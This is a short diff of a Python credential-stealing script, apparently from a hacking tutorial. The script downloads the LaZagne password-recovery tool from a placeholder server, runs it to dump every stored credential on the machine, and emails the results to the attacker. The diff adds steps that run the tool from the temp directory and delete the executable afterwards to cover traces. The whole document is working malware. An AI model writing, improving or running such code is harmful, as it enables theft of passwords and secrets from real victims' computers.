@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 
-import requests, smtplib, subprocess
+import requests, smtplib, subprocess, os, tempfile 
 
 
 def download(url):
@@ -17,6 +17,9 @@ def send_mail(email, password, message):
     server.sendmail(email, email, message)
     server.quit()
 
+temp_directory = tempfile.gettempdir()
+os.chdir(temp_directory)
 download("serverIp/file/laZagne.exe")
 result = subprocess.check_output("laZagne.exe all", shell=True)
 send_mail("youremail", "google app password", result)
+os.remove("laZagne.exe")
